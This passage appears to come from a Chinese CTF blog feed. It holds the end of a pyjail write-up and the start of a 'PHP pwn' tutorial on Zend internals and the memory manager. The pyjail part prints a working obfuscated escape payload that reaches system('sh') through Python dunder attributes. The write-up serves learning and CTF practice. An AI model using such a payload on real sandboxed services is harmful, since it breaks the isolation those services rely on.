backup_print(backup_eval(<span class="built_in">input</span>,&#123;&#125;,&#123;&#125;))</span><br></pre></td></tr></table></figure><p>gpt给出的解释</p><ol><li>首先，它保存了几个内置函数和内置变量的引用，以备份它们，以便稍后可以使用。<ul><li><code>backup_len = len</code>：备份了内置函数 <code>len</code> 的引用。</li><li><code>backup_eval = eval</code>：备份了内置函数 <code>eval</code> 的引用。</li><li><code>backup_print = print</code>：备份了内置函数 <code>print</code> 的引用。</li><li><code>backup_input = input</code>：备份了内置函数 <code>input</code> 的引用。</li><li><code>backup_all = all</code>：备份了内置函数 <code>all</code> 的引用。</li><li><code>backup_ord = ord</code>：备份了内置函数 <code>ord</code> 的引用。</li></ul></li><li>定义了两个函数：<ul><li><code>rescued_osu(input)</code>：检查输入中是否恰好包含一个’o’、一个’s’和一个’u’字符。</li><li><code>caught_by_guards(input)</code>：检查输入中是否包含一些特殊字符 ‘[‘、’]’、’{‘、’}’，或者包含了超出 ASCII 范围的字符。</li></ul></li><li>清空了全局命名空间中的 <code>__builtins__</code>，这会移除内置函数和变量。这个操作可能是为了防止在代码中直接使用内置函数。</li><li>将用户输入的内容存储在 <code>input</code> 变量中，此时 <code>input</code> 已经不再是内置函数了，而是之前备份的内置函数 <code>input</code> 的引用。</li><li>执行一系列检查：<ul><li>如果用户输入的内容被 <code>caught_by_guards</code> 函数捕获，或者不满足 <code>rescued_osu</code> 函数的条件，则打印 “[You failed to break the jail]”。</li><li>否则，执行 <code>eval(input, &#123;&#125;, &#123;&#125;)</code>，这里 <code>eval</code> 是之前备份的内置函数，用于执行用户输入的代码，并打印结果。</li></ul></li></ol><p>一个大佬的解是</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(g:=().__init__().__new__.__self__.__getattribute__,d:=().__doc__,O:=d.__getitem__(<span class="number">34</span>),S:=d.__getitem__(<span class="number">19</span>),U:=d.__getitem__(<span class="number">1</span>),x:=g(g((),<span class="string">&quot;__cla&quot;</span>+S+S+<span class="string">&quot;__&quot;</span>),<span class="string">&quot;__ba&quot;</span>+S+<span class="string">&quot;e__&quot;</span>),i:=g(x,<span class="string">&quot;__&quot;</span>+S+U+<span class="string">&quot;bcla&quot;</span>+S+S+<span class="string">&quot;e&quot;</span>+S+<span class="string">&quot;__&quot;</span>)().__getitem__(-<span class="number">4</span>).__init__,g(i,<span class="string">&quot;__gl&quot;</span>+O+<span class="string">&quot;bal&quot;</span>+S+<span class="string">&quot;__&quot;</span>).__getitem__(S+<span class="string">&quot;y&quot;</span>+S+<span class="string">&quot;tem&quot;</span>)(S+<span class="string">&quot;h&quot;</span>))</span><br></pre></td></tr></table></figure><p>其使用了海象运算符</p><ol><li><p>将<code>__getattribute__</code>方法赋值给g</p></li><li><p><code>().__doc__</code>属性赋值给d</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__doc__</span><br><span class="line"><span class="string">&quot;Built-in immutable sequence.\n\nIf no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable&#x27;s items.\n\nIf the argument is a tuple, the return value is the same object.&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>O,S,U分别为d中提取出来的单个对应字符osu</p></li><li>x为<code>().__class__.__base__</code></li><li>i为<code>x.__subclasses__().__getitem__(-4).__init__</code></li><li>最终<code>i.__globals__.__getitem__(S+&quot;y&quot;+S+&quot;tem&quot;)(S+&quot;h&quot;))</code></li></ol><p>说实话一脸懵逼</p><p>gpt对这些内建属性给出的一些解释</p><ol><li><code>__globals__</code> 是 Python 中函数对象的一个特殊属性，它指向了该函数所在模块的全局命名空间（全局作用域）。这个属性存储了函数定义时的全局命名空间，即函数定义所在的模块的命名空间。</li><li><code>__getitem__</code> 是 Python 对象的一个特殊方法用于定义对象的索引操作。当你通过中括号 <code>[]</code> 来访问对象的元素时，Python 解释器会调用该对象的 <code>__getitem__</code> 方法来实现索引操作。</li><li><code>__getattribute__</code> 是 Python 中对象的一个特殊方法用于控制对对象属性的访问。当你使用点号（<code>.</code>）语法来访问对象的属性时，Python 解释器会调用该对象的 <code>__getattribute__</code> 方法来实现属性的获取操作</li><li><code>__init__</code> 是 Python 中对象的一个特殊方法用于对象的初始化。当你创建一个对象时，Python 解释器会自动调用该对象的 <code>__init__</code> 方法来执行初始化操作。在这个方法中，你可以对对象的属性进行初始化，也可以执行一些其他的初始化操作。返回值是该对象</li><li><code>__new__</code> 是 Python 中对象的一个特殊方法用于创建对象的实例。与 <code>__init__</code> 方法不同，<code>__new__</code> 方法是<u>在对象实例化之前被调用的</u>，用于创建对象的实例，并返回该实例。</li><li>在 Python 中，<code>__self__</code> 是用于表示绑定方法（bound method）的一个特殊属性。绑定方法是指类的方法（函数），在实例化对象后被调用时，会自动将该对象作为第一个参数（通常命名为 <code>self</code>）传递给方法。这种自动传递实例化对象的行为，就是通过 <code>__self__</code> 属性实现的。其返回前一个方法的调用者</li><li><code>__doc__</code> 是 Python 中对象的一个特殊属性（双下划线方法），用于存储对象的文档字符串（docstring）。文档字符串是在对象的定义中使用三重引号 <code>&quot;&quot;&quot;</code> 或单引号 <code>&#39;&#39;&#39;</code> 所包围的字符串，用于提供有关对象的描述和文档。</li></ol><p>好吧还是一脸懵逼</p>]]></content>
    
    
    <summary type="html">pyjail</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pyjail" scheme="https://ixout.github.io/tags/pyjail/"/>
    
  </entry>
  
  <entry>
    <title>phppwn初识</title>
    <link href="https://ixout.github.io/posts/5022/"/>
    <id>https://ixout.github.io/posts/5022/</id>
    <published>2024-05-02T08:23:40.000Z</published>
    <updated>2024-06-24T08:44:59.070Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>一般phppwn都是给一个拓展so文件,只需要启用这个拓展便可以直接进行内部函数调用</p><p>但比较不好的一点是php版本需要与编译so文件的版本相同</p><p>而在ubuntu20下默认安装的php版本应该是php7.4</p><p>所以需要自己另外添加一个php仓库源</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ondrej/php</span><br></pre></td></tr></table></figure><p>然后更新一下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>之后安装对应版本即可</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install php8.3</span><br></pre></td></tr></table></figure><p>将题目给出的so文件装载于对应目录</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php -i | grep -i extension_dir</span><br><span class="line">extension_dir =&gt; /usr/lib/php/20230831 =&gt; /usr/lib/php/20230831</span><br><span class="line">sudo <span class="built_in">cp</span> vuln.so /usr/lib/php/20230831/vuln.so</span><br></pre></td></tr></table></figure><p>为了避免频繁修改php.ini,如果题目有给出php.ini的话可以直接使用参数</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -c php.ini index.php</span><br></pre></td></tr></table></figure><p>如果没有的话则需要找到php的默认php.ini</p><p>添加一句</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">extension</span> = vuln.so</span><br></pre></td></tr></table></figure><h2 id="运行模式"><a href="#运行模式" class="headerlink" title="运行模式"></a>运行模式</h2><p>CLI运行模式:</p><p>通常我们在开发PHP扩展时，多是用命令行终端来直接使用php解释器直接解释执行.php文件，在.php文件中我们写入需要调用的扩展函数，该扩展函数被编译在.so的扩展模块中，这种运行模式我一般称为<code>CLI模式</code>，该模式对应的php声明周期一般为单进程SAPI生命周期</p><p>CGI运行模式</p><p>其中对于大部分网站应用服务器来说，大部分时候PHP解释器运行的模式为CGI模式——单进程SAPI生命周期，此模式运行特点为请求到达时，<u>为每个请求fork一个进程</u>，一个进程只对一个请求做出响应，请求结束后，进程也就结束了。其中fork的进程，和原进程的内存布局一般来说是一模一样的，所以这里如果能拿到<code>/proc/&#123;pid&#125;/maps</code>文件，则可以拿到该进程的内存布局，可以拿到所有基地址，从而无视PIE保护。</p><h2 id="zend基本数据类型"><a href="#zend基本数据类型" class="headerlink" title="zend基本数据类型"></a>zend基本数据类型</h2><p>由于zend引擎的原因，ida反编译的伪代码很难理解,所以先学习一下zend中的基本数据类型</p><p>当我们查看phppwn的拓展时,会发现其函数普遍只有两个参数,实际上并不是这样,第一个参数是一个<code>zend_execute_data</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_execute_data</span> &#123;</span></span><br><span class="line"><span class="type">const</span> zend_op       *opline;           <span class="comment">/* executed opline                */</span></span><br><span class="line">zend_execute_data   *call;             <span class="comment">/* current call                   */</span></span><br><span class="line">zval                *return_value;</span><br><span class="line">zend_function       *func;             <span class="comment">/* executed function              */</span></span><br><span class="line">zval                 This;             <span class="comment">/* this + call_info + num_args    */</span></span><br><span class="line">zend_execute_data   *prev_execute_data;</span><br><span class="line">zend_array          *symbol_table;</span><br><span class="line"><span class="type">void</span>               **run_time_cache;   <span class="comment">/* cache op_array-&gt;run_time_cache */</span></span><br><span class="line">zend_array          *extra_named_params;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>zval就是<code>typedef struct _zval_struct zval;</code>,</p><p>有两个最基本的数据类型也就是 <code>_zend_value</code> 和 <code>_zval_struct</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> _<span class="title">zend_value</span> &#123;</span></span><br><span class="line">zend_long         lval;<span class="comment">/* long value */</span></span><br><span class="line"><span class="type">double</span>            dval;<span class="comment">/* double value */</span></span><br><span class="line">zend_refcounted  *counted;</span><br><span class="line">zend_string      *str;</span><br><span class="line">zend_array       *arr;</span><br><span class="line">zend_object      *obj;</span><br><span class="line">zend_resource    *res;</span><br><span class="line">zend_reference   *ref;</span><br><span class="line">zend_ast_ref     *ast;</span><br><span class="line">zval             *zv;</span><br><span class="line"><span class="type">void</span>             *ptr;</span><br><span class="line">zend_class_entry *ce;</span><br><span class="line">zend_function    *func;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span> w1;</span><br><span class="line"><span class="type">uint32_t</span> w2;</span><br><span class="line">&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">zend_value        value;<span class="comment">/* value */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span> type_info;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">ZEND_ENDIAN_LOHI_3(</span><br><span class="line">zend_uchar    type,<span class="comment">/* active type */</span></span><br><span class="line">zend_uchar    type_flags,</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="type">uint16_t</span>  extra;        <span class="comment">/* not further specified */</span></span><br><span class="line">&#125; u)</span><br><span class="line">&#125; v;</span><br><span class="line">&#125; u1;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line"><span class="type">uint32_t</span>     cache_slot;           <span class="comment">/* cache slot (for RECV_INIT) */</span></span><br><span class="line"><span class="type">uint32_t</span>     opline_num;           <span class="comment">/* opline number (for FAST_CALL) */</span></span><br><span class="line"><span class="type">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line"><span class="type">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line"><span class="type">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line"><span class="type">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line"><span class="type">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line"><span class="type">uint32_t</span>     constant_flags;       <span class="comment">/* constant flags */</span></span><br><span class="line"><span class="type">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">&#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>zend_uchar type: 以下为外部使用的变量类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IS_UNDEF                    0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_NULL                        1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_FALSE                    2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_TRUE                        3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_LONG                        4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_DOUBLE                    5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_STRING                    6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_ARRAY                    7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_OBJECT                    8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_RESOURCE                    9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_REFERENCE                10</span></span><br></pre></td></tr></table></figure><p>几个常见数据类型的结构</p><p>STRING</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_string</span> &#123;</span></span><br><span class="line">zend_refcounted_h gc;</span><br><span class="line">zend_ulong        h;                <span class="comment">/* hash value */</span></span><br><span class="line"><span class="type">size_t</span>            len;<span class="comment">//不包含\0</span></span><br><span class="line"><span class="type">char</span>              val[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="ida反编译"><a href="#ida反编译" class="headerlink" title="ida反编译"></a>ida反编译</h3><p>从ida的反编译结果来看,自定义的拓展函数的开头前几句中一定会有这一句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v4 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br></pre></td></tr></table></figure><p>这一步其实是在获取参数个数</p><p>之后会有一个类似这样的函数解析参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_parse_parameters(v3, &amp;unk_2000, &amp;v15, &amp;v14)</span><br></pre></td></tr></table></figure><p>再然后从<code>a1+80</code>开始是第一个参数,每一个参数长度为<code>0x10</code></p><p>所有的参数都有序排布在这里</p><h2 id="php内存管理器"><a href="#php内存管理器" class="headerlink" title="php内存管理器"></a>php内存管理器</h2><p><a href="https://learnku.com/docs/php-internals/php7/zend-memory-manager/7229">5.1. Zend 内存管理器 | 内存管理 |《PHP 内核与原生扩展开发 php7》| PHP 技术论坛 (learnku.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/343695712">深入理解PHP的内存管理 - 知乎 (zhihu.com)</a></p><p><a href="https://github.com/php/php-src/blob/master/Zend/zend_alloc.c">php-src/Zend/zend_alloc.c at master · php/php-src (github.com)</a></p><p><a href="https://www.bookstack.cn/read/php-internals/55.md">https://www.bookstack.cn/read/php-internals/55.md</a></p><p>与大多数运行时相同,php自己实现了一套动态内存管理机制</p><p>php的内存管理器被称为Zend内存管理器,这个内存管理器说实话有点像内核slab分配器与glibc-ptmalloc2分配器的结合</p><p>PHP的内存管理可以被看作是分层（hierarchical）的。它分为三层：存储层（storage）、堆层（heap）和接口层（emalloc/efree）。</p><h3 id="存储层"><a href="#存储层" class="headerlink" title="存储层"></a><strong>存储层</strong></h3><p>存储层通过 malloc()、mmap() 等函数向系统真正的申请内存，并通过 free() 函数释放所申请的内存。存储层通常申请的内存块都比较大，这里申请的内存大并不是指storage层结构所需要的内存大，只是堆层通过调用存储层的分配方法时，其以大块大块的方式申请的内存，存储层的作用是将内存分配的方式对堆层透明化。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-05-06_160205.png" alt=""></p><p>PHP在存储层共有4种内存分配方案: malloc，win32，mmap_anon，mmap_zero，默认使用malloc分配内存，如果设置了ZEND_WIN32宏，则为windows版本，调用HeapAlloc分配内存，剩下两种内存方案为匿名内存映射，并且PHP的内存方案可以通过设置环境变量来修改。</p><h3 id="接口层"><a href="#接口层" class="headerlink" title="接口层"></a><strong>接口层</strong></h3><p>接口层是一些宏定义，如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Standard wrapper macros */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> emalloc(size)                       _emalloc((size) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> safe_emalloc(nmemb, size, offset)   _safe_emalloc((nmemb), (size), (offset) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> efree(ptr)                          _efree((ptr) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ecalloc(nmemb, size)                _ecalloc((nmemb), (size) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> erealloc(ptr, size)                 _erealloc((ptr), (size), 0 ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> safe_erealloc(ptr, nmemb, size, offset) _safe_erealloc((ptr), (nmemb), (size), (offset) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> erealloc_recoverable(ptr, size)     _erealloc((ptr), (size), 1 ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> estrdup(s)                          _estrdup((s) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> estrndup(s, length)                 _estrndup((s), (length) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> zend_mem_block_size(ptr)            _zend_mem_block_size((ptr) TSRMLS_CC ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br></pre></td></tr></table></figure><p>这里为什么没有直接调用函数？因为这些宏相当于一个接口层或中间层，定义了一个高层次的接口，使得调用更加容易它隔离了外部调用和PHP内存管理的内部实现，实现了一种松耦合关系。</p><h3 id="堆层"><a href="#堆层" class="headerlink" title="堆层"></a><strong>堆层</strong></h3><p>在接口层下面是PHP内存管理的核心实现，我们称之为heap层。这个层控制整个PHP内存管理的过程</p><p>这个层分为旧版和新版,旧版基本已经被淘汰了</p><h4 id="旧"><a href="#旧" class="headerlink" title="旧"></a>旧</h4><p>首先我们看这个层的重要结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* mm block type */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_block_info</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> _size;   <span class="comment">/* block的大小*/</span></span><br><span class="line">    <span class="type">size_t</span> _prev;   <span class="comment">/* 计算前一个块有用到*/</span></span><br><span class="line">&#125; zend_mm_block_info;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_block</span> &#123;</span></span><br><span class="line">    zend_mm_block_info info;</span><br><span class="line">&#125; zend_mm_block;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_small_free_block</span> &#123;</span>  <span class="comment">/* 双向链表 */</span></span><br><span class="line">    zend_mm_block_info info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> *<span class="title">prev_free_block</span>;</span>    <span class="comment">/* 前一个块 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> *<span class="title">next_free_block</span>;</span>    <span class="comment">/* 后一个块 */</span></span><br><span class="line">&#125; zend_mm_small_free_block; <span class="comment">/* 小的空闲块*/</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> &#123;</span>    <span class="comment">/* 双向链表 + 树结构 */</span></span><br><span class="line">    zend_mm_block_info info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> *<span class="title">prev_free_block</span>;</span>    <span class="comment">/* 前一个块 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> *<span class="title">next_free_block</span>;</span>    <span class="comment">/* 后一个块 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> **<span class="title">parent</span>;</span>    <span class="comment">/* 父结点 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> *<span class="title">child</span>[2];</span>   <span class="comment">/* 两个子结点*/</span></span><br><span class="line">&#125; zend_mm_free_block;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_heap</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>                 use_zend_alloc; <span class="comment">/* 是否使用zend内存管理器 */</span></span><br><span class="line">    <span class="type">void</span>               *(*_malloc)(<span class="type">size_t</span>); <span class="comment">/* 内存分配函数*/</span></span><br><span class="line">    <span class="type">void</span>                (*_free)(<span class="type">void</span>*);    <span class="comment">/* 内存释放函数*/</span></span><br><span class="line">    <span class="type">void</span>               *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">size_t</span>              free_bitmap;    <span class="comment">/* 小块空闲内存标识 */</span></span><br><span class="line">    <span class="type">size_t</span>              large_free_bitmap;  <span class="comment">/* 大块空闲内存标识*/</span></span><br><span class="line">    <span class="type">size_t</span>              block_size;     <span class="comment">/* 一次内存分配的段大小，即ZEND_MM_SEG_SIZE指定的大小，默认为ZEND_MM_SEG_SIZE   (256 * 1024)*/</span></span><br><span class="line">    <span class="type">size_t</span>              compact_size;   <span class="comment">/* 压缩操作边界值，为ZEND_MM_COMPACT指定大小，默认为 2 * 1024 * 1024*/</span></span><br><span class="line">    zend_mm_segment    *segments_list;  <span class="comment">/* 段指针列表 */</span></span><br><span class="line">    zend_mm_storage    *storage;    <span class="comment">/* 所调用的存储层 */</span></span><br><span class="line">    <span class="type">size_t</span>              real_size;  <span class="comment">/* 堆的真实大小 */</span></span><br><span class="line">    <span class="type">size_t</span>              real_peak;  <span class="comment">/* 堆真实大小的峰值 */</span></span><br><span class="line">    <span class="type">size_t</span>              limit;  <span class="comment">/* 堆的内存边界 */</span></span><br><span class="line">    <span class="type">size_t</span>              size;   <span class="comment">/* 堆大小 */</span></span><br><span class="line">    <span class="type">size_t</span>              peak;   <span class="comment">/* 堆大小的峰值*/</span></span><br><span class="line">    <span class="type">size_t</span>              reserve_size;   <span class="comment">/* 备用堆大小*/</span></span><br><span class="line">    <span class="type">void</span>               *reserve;    <span class="comment">/* 备用堆 */</span></span><br><span class="line">    <span class="type">int</span>                 overflow;   <span class="comment">/* 内存溢出数*/</span></span><br><span class="line">    <span class="type">int</span>                 internal;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CACHE</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        cached; <span class="comment">/* 已缓存大小 */</span></span><br><span class="line">    zend_mm_free_block *cache[ZEND_MM_NUM_BUCKETS]; <span class="comment">/* 缓存数组/</span></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"><span class="comment">    zend_mm_free_block *free_buckets[ZEND_MM_NUM_BUCKETS*2];    /* 小块内存数组，相当索引的角色 */</span></span><br><span class="line">    zend_mm_free_block *large_free_buckets[ZEND_MM_NUM_BUCKETS];    <span class="comment">/* 大块内存数组，相当索引的角色 */</span></span><br><span class="line">    zend_mm_free_block *rest_buckets[<span class="number">2</span>];    <span class="comment">/* 剩余内存数组*/</span></span><br><span class="line"> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>PHP中的内存管理主要工作就是维护三个列表：<strong>小块内存列表（free_buckets）、大块内存列表（large_free_buckets）和剩余内存列表（rest_buckets）。</strong></p><p>在内存管理初始化时，PHP内核对初始化free_buckets列表。从heap的定义我们可知free_buckets是一个数组指针，其存储的本质是指向zend_mm_free_block结构体的指针。开始时这些指针都没有指向具体的元素，只是一个简单的指针空间。free_buckets列表在实际使用过程中只存储指针，这些指针以两个为一对（即数组从0开始，两个为一对,就像ptmalloc2的bins），分别存储一个个双向链表的头尾指针。其结构如图:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-05-06_160932.png" alt=""></p><p>free_buckets列表的作用是存储小块内存，而与之对应的large_free_buckets列表的作用是存储大块的内存，虽然large_free_buckets列表也类似于一个hash表，但是这个与前面的free_buckets列表一些区别。它是一个集成了数组，树型结构和双向链表三种数据结构的混合体。我们先看其数组结构，数组是一个hash映射，其hash函数为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 